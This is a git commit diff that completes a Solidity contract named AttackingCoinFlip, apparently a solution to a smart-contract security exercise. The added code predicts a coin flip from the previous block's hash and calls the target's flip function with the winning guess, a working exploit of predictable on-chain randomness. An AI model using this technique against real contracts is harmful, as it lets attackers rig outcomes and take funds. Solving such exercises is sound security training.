d00d2f2d96bd0b9b66b41c715afbb453be8842bf
Milan <milansaxena10@gmail.com>
2022-08-23 09:30:25 -0700

    Finished CoinFlip

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -2,8 +2,14 @@
 pragma solidity ^0.8.9;
 import "./CoinFlip.sol";
 
+interface CoinFlipInterface {
+    function flip(bool _guess) external returns (bool);
+}
+
 contract AttackingCoinFlip {
     address public contractAddress;
+    uint256 private constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
@@ -11,5 +17,9 @@ contract AttackingCoinFlip {
 
     function hackContract() external {
         // Code me!
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        CoinFlipInterface(contractAddress).flip(side);
     }
 }
